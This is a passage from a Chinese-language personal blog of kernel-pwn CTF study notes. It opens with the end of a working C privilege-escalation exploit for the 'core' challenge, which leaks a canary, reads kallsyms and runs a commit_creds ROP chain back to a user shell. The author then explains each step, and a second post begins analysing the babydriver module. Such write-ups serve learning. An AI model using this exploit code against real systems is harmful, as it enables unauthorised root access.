class="string">&quot;commit_creds_addr:%p\n&quot;</span>,commit_creds);</span><br><span class="line">            vmlinux_base=commit_creds<span class="number">-0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base_addr:%p&quot;</span>,vmlinux_base);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;prepare_kernel_cred&quot;</span>)&amp;&amp;!prepare_kernel_cred)&#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred_addr:%p\n&quot;</span>,prepare_kernel_cred);</span><br><span class="line">            vmlinux_base=prepare_kernel_cred<span class="number">-0x9cce0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred&amp;commit_creds))&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]addr error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp,rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has ben saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_off</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">long</span> <span class="keyword">long</span> idx)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]set off to %ld\n&quot;</span>,idx);</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889c</span>,idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_read</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]read to buf.&quot;</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_copy_func</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">long</span> <span class="keyword">long</span> size)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]copy from user with size :%ld\n&quot;</span>,size);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889A</span>, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="keyword">int</span> fd=open(<span class="string">&quot;/proc/core&quot;</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open core error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    find_symbols();</span><br><span class="line">    <span class="keyword">ssize_t</span> offset=vmlinux_base-raw_vmlinux_base;</span><br><span class="line">    set_off(fd,<span class="number">0x40</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x40</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    core_read(fd,buf);</span><br><span class="line">    <span class="keyword">size_t</span> canary=((<span class="keyword">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]canary: %p\n&quot;</span>,canary);</span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">0x1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        rop[i]=canary;</span><br><span class="line">    &#125;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = prepare_kernel_cred;         <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset; <span class="comment">// pop rdx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81021e53</span> + offset; <span class="comment">// pop rcx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset; <span class="comment">// mov rdi, rax; call rdx; </span></span><br><span class="line">    rop[i++] = commit_creds;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)usr_shell;         <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line">    write(fd,rop,<span class="number">0x800</span>);</span><br><span class="line">    core_copy_func(fd,<span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>脚本中有很多东西值得思考学习。</p>
<p><strong><strong><strong>asm</strong></strong></strong></p>
<p>这是c语言的内联汇编代码关键字，通过他可以在c语言内执行汇编代码，比如上面这个函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp,rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has ben saved.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后在main函数内调用savestatus函数就能执行这段汇编代码了。不过要注意在编译的时候得加上-masm=intel.我百度了一下发现他们用内联汇编都是__asm{}，像脚本里这样写还是不多，然后他们使用汇编对程序的变量赋值都是采用占位符的方式，脚本里也直接用变量名了，可能是什么另类的方式😃，这段汇编的作用就是记录用户态的信息，等会rop返回用户态的时候用。</p>
<p><strong>find_symbols</strong></p>
<p>通过这个函数打开tmp/kallsyms文件，这个文件记录着内核态的所有符号信息以及对应的地址，当使用命令行打开这个文件是这样的（我随便截的）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ffffffff866dcbf0 t qdisc_lookup_default</span><br><span class="line">ffffffff866dcc40 T __qdisc_calculate_pkt_len</span><br><span class="line">ffffffff866dcca0 t stab_kfree_rcu</span><br><span class="line">ffffffff866dccb0 T qdisc_watchdog_init</span><br><span class="line">ffffffff866dcce0 t qdisc_watchdog</span><br><span class="line">ffffffff866dcd00 T qdisc_watchdog_cancel</span><br><span class="line">ffffffff866dcd10 T qdisc_class_hash_destroy</span><br></pre></td></tr></table></figure>

<p>在脚本里是0x30字符读一次，我他脚本里读的东西输出试试</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ffffffffb6499720 T func_ptr_is_kernel_text</span><br><span class="line"></span><br><span class="line">ffffffffb6499770 t param_array_free</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>是这种输出形式的，应该是每一列都是0x30个字符，所以读的时候fgets(buf,0x30,kakksyms_fd)刚好是读一列，然后查看每一列是否包含<code>commit_creds</code>和<code>prepare_kernel_cred</code>字符串，如果有的话就把前面的地址读出来。</p>
<p><strong>计算地址</strong></p>
<p>计算地址的方式也和用户态不一样，看脚本的时候没看懂，慢慢敲的时候才想明白，在用户态我们一般是求出基地址然后加上偏移量确定地址，求出偏移量的方式类似<code>libc.sym[&#39;__malloc_hook&#39;]</code>（可能libc的逻辑基地址就是0），但使用<code>elf.sym[]</code>求内核某一符号的地址，得到的不是偏移量而是逻辑地址,比如下面</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Python 2.7.12 (default, Mar  1 2021, 11:38:31) </span><br><span class="line">[GCC 5.4.0 20160609] on linux2</span><br><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; from pwn import *</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; vmlinux=ELF(<span class="string">&quot;./vmlinux&quot;</span>)</span></span><br><span class="line">[*] &#x27;/home/rootzhang/kernelstudy/pwn2/give_to_player/vmlinux&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    Version:  4.15.8</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0xffffffff81000000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; hex(vmlinux.sym[<span class="string">&quot;commit_creds&quot;</span>])</span></span><br><span class="line">&#x27;0xffffffff8107fc8d&#x27;</span><br></pre></td></tr></table></figure>

<p>所以要算出偏移量的话还得减去vmlinux的逻辑基地址</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; hex(vmlinux.sym[<span class="string">&#x27;commit_creds&#x27;</span>] - 0xffffffff81000000)</span></span><br><span class="line">&#x27;0x9c8e0&#x27;</span><br></pre></td></tr></table></figure>

<p>在利用kallsyms得到commit_creds基地址后减去<code>&#39;0x9c8e0&#39;</code>就是真实的虚拟基地址了，脚本中的0ffset不是gadget的偏移量，而是逻辑基地址和虚拟基地址的差值，再加上gadget的逻辑地址就是这个gadget的虚拟地址了。</p>
<p>寻找gadget的方法如下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">把汇编提取出来然后在gadget里面搜索</span></span><br><span class="line">objdump -d vmlinux &gt; gadget</span><br><span class="line"><span class="meta">#</span><span class="bash">我不知道怎么高效搜索，我是这样搜的,搜出来一大堆东西，目前只能肉眼去找</span></span><br><span class="line">grep -E &quot;pop|ret&quot; ./gadget</span><br></pre></td></tr></table></figure>

<p><strong>返回用户态</strong></p>
<p>前面都是小兵，处理完小兵后该屠大龙了。</p>
<p>之前有稍微介绍过如何状态切换，总结起来就是两个指令，一个是<code>swapgs</code>，一个是<code>iretq</code></p>
<p>首先介绍几个重要寄存器</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cs是代码段寄存器</span><br><span class="line">ds是数据段寄存器</span><br><span class="line">ss是堆栈段寄存器</span><br><span class="line">es是扩展段寄存器</span><br><span class="line">fs是标志段寄存器</span><br><span class="line">gs是全局段寄存器</span><br></pre></td></tr></table></figure>

<p><code>swapgs</code>:这个指令是切换GS寄存器的值，内核态或者用户态的GS寄存器的值储存在某个地方，如果要切换的话，就和这个值进行交换。</p>
<p><code>iretq</code>:恢复到用户控件继续执行。如果使用 <code>iretq</code> 还需要给出用户空间的一些信息（CS, eflags/rflags, esp/rsp 等）,执行iretq的时候会自动pop出四个值，分别是user_cs,user_rflags,user_sp,user_ss</p>
<p>所以恢复到用户态并执行system(“/bin/sh”)的rop这样构造</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">   rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">   rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">   rop[i++] = (<span class="keyword">size_t</span>)spawn_shell;         <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">   rop[i++] = user_cs;</span><br><span class="line">   rop[i++] = user_rflags;</span><br><span class="line">   rop[i++] = user_sp;</span><br><span class="line">   rop[i++] = user_ss;</span><br></pre></td></tr></table></figure>

<p>其中后面pop的值是我们前面通过内联汇编找到的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__asm__(</span><br><span class="line">     <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">     <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">     <span class="string">&quot;mov user_sp,rsp;&quot;</span></span><br><span class="line">     <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">     <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line"> );</span><br></pre></td></tr></table></figure>

<p>其中pushf就是push状态标志寄存器的值也就是rflags,然后pop接收。</p>
<p><strong>开始调试</strong></p>
<p>调试过程就省略了，不过我终于搞明白这个rop最难理解的地方了，原来call会先把一个地址压栈然后才去执行地址，所以的pop rcx.扫噶，不过有一说一调试内核gdb运行的真的慢。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>今天了解到了很多知识，感觉还不错，哦对最近写知识总结的时候总喜欢听着一首写</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">列车粗糙而过</span><br><span class="line">叫醒我频频失神</span><br><span class="line">---我会在每个有意义的时辰</span><br></pre></td></tr></table></figure>




      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/10/kernel-babydirver/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/02/10/kernel-babydirver/" class="post-title-link" itemprop="url">kernel-babydirver</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-02-10 20:31:37 / 修改时间：20:34:13" itemprop="dateCreated datePublished" datetime="2022-02-10T20:31:37+08:00">2022-02-10</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="kernelpwn入门"><a href="#kernelpwn入门" class="headerlink" title="kernelpwn入门"></a>kernelpwn入门</h1><h2 id="babydriver"><a href="#babydriver" class="headerlink" title="babydriver"></a>babydriver</h2><p>这是ctfwiki上面的第一道例题，首先下载附件，漏洞一般出现在.ko上，.ko文件的装载又在文件系统的init文件中，所以第一步解包文件系统。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">mkdir rootfs </span><br><span class="line">mv rootfs.cpio ./rootfs/</span><br><span class="line">cd rootfs</span><br><span class="line">cpio -idmv &lt; rootfs.cpio</span><br><span class="line">cat init</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"> </span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">chown root:root flag</span><br><span class="line">chmod 400 flag</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">insmod /lib/modules/4.4.72/babydriver.ko</span><br><span class="line">chmod 777 /dev/babydev</span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现了可装载模块babydriver.ko，阅读其他wp的时候发现他们还会用checksec查看.ko文件的保护，这块我不能理解，按照逻辑来说，它装载到了内核，应该和内核共享一套保护措施了，为啥还要检查他用户态的保护措施（？），除了看到了.ko文件，还发现他对flag文件进行了权限限制<code>chown root:root flagchmod 400 flag</code></p>
<p>Linux/Unix 的文件调用权限分为三级 : 文件所有者（Owner）、用户组（Group）、其它用户（Other Users）,文件所有者就是创建这个文件的人。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> 数字权限是基于二进制数字系统而创建的，读（read，r）的值是4，写（write，w）的值是2，执行（execute，x）的值是1，没有授权的值是0。这种模式下，权限组合变成简单的加分运算。于是，在ls -l命令表示的数字权限对应关系是：</span><br><span class="line">0 ---</span><br><span class="line">1 --x</span><br><span class="line">2 -w-</span><br><span class="line">3 -wx</span><br><span class="line">4 r--</span><br><span class="line">5 r-x</span><br><span class="line">6 rw-</span><br><span class="line">7 rwx</span><br><span class="line">虽然可以设置各式各样的权限，但常用的权限只有几种。它们的含义是：</span><br><span class="line">400   -r--------   拥有者能够读，其他任何人不能进行任何操作；</span><br><span class="line">644   -rw-r--r--   拥有者都能够读，但只有拥有者可以编辑；</span><br><span class="line">660   -rw-rw----   拥有者和组用户都可读和写，其他人不能进行任何操作；</span><br><span class="line">664   -rw-rw-r--   所有人都可读，但只有拥有者和组用户可编辑；</span><br><span class="line">700   -rwx------   拥有者能够读、写和执行，其他用户不能任何操作；</span><br><span class="line">744   -rwxr--r--   所有人都能读，但只有拥有者才能编辑和执行；</span><br><span class="line">755   -rwxr-xr-x   所有人都能读和执行，但只有拥有者才能编辑；</span><br><span class="line">777   -rwxrwxrwx   所有人都能读、写和执行（该设置通常不是好想法）。</span><br></pre></td></tr></table></figure>

<p>综上所述，第一条指令就是把flag文件的文件所有者改成了root用户，然后第二条指令的作用是只有文件所有者才能读flag文件，即root用户才能读这个文件。</p>
<p>所以要读这个flag文件就得通过.ko文件进行提权。</p>
<p>通过ida对.ko文件进行静态分析</p>
<p>shitf+f9发现很多结构体，通过别人的wp对这些结构体有了初步的认识，其中’file_operations’结构体算是解决了我的一个困惑，我之前不明白为什么在程序中调用ioctl就能调用设备的babyioctl函数了，原来程序在init的时候会进行类似重定向的操作，这个.ko就在<code>cdev_init(&amp;cdev_0, &amp;fops)</code>中进行，最后的重定向表是这个样子的</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">通过对比可以知道对设备文件的操作会通过如下函数进行处理（注意这里IDA显示的有些问题，release其实对应的是babyrelease）：</span><br><span class="line">* open: babyopen</span><br><span class="line">* read: babyread</span><br><span class="line">* write: babywrite</span><br><span class="line">* ioctl: babyioctl</span><br><span class="line">* release: babyrelease</span><br></pre></td></tr></table></figure>

<p>这个是别人的wp搬用的，我现在只知道会有重定向的操作，但无法具体分析出重定向表。</p>
<p>第二个需要注意的是babydevice_t结构体，这个结构体在之后的漏洞利用中起关键作用。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00000000 babydevice_t    struc ; (sizeof=0x10, align=0x8, copyof_429)</span><br><span class="line">00000000                                         ; XREF: .bss:babydev_struct/r</span><br><span class="line">00000000 device_buf      dq ?                    ; XREF: babyrelease+6/r</span><br><span class="line">00000000                                         ; babyopen+26/w ... ; offset</span><br><span class="line">00000008 device_buf_len  dq ?                    ; XREF: babyopen+2D/w</span><br><span class="line">00000008                                         ; babyioctl+3C/w ...</span><br><span class="line">00000010 babydevice_t    ends</span><br></pre></td></tr></table></figure>

<p>下面对文件的每个函数具体分析</p>
<p><strong>babyopen</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">babyopen</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  babydev_struct.device_buf = (<span class="keyword">char</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">37748928LL</span>, <span class="number">64LL</span>);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">64LL</span>;</span><br><span class="line">  printk(<span class="string">&quot;device open\n&quot;</span>, <span class="number">37748928LL</span>, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数对应open函数，在每次通过open函数打开设备的时候就会调用这个函数，函数的主要逻辑就是用kmalloc申请一个64字节的堆，然后把堆地址储存在babaydevice_t.buf上，然后把长度储存在babydevice_t.buf_len上面</p>
<p><strong>babyread</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">babyread</span><span class="params">(file *filp, <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_to_user(buffer);</span><br><span class="line">    result = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对应read函数，函数的逻辑是查看babydevice是否有值，如果有的话那长度和传进来的v4进行比较，如果大于的话就把babydevice_t.buf的值拷贝到buffer，这个buffer就是我们传递的参数。</p>
<p><strong>babywrite</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">babywrite</span><span class="params">(file *filp, <span class="keyword">const</span> <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_from_user(babydev_struct.device_buf, (<span class="keyword">void</span> *)buffer, (<span class="keyword">void</span> *)v4);</span><br><span class="line">    result = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>对应write函数，奇怪我的ida反编译出的代码和别人的不一样，函数的逻辑就是检查要拷贝的长度是否小于babydevice_t.len_buf，如果小于的话就把buffer的值传递给babydevice_t.buf</p>
<p><strong>babyioctl</strong></p>
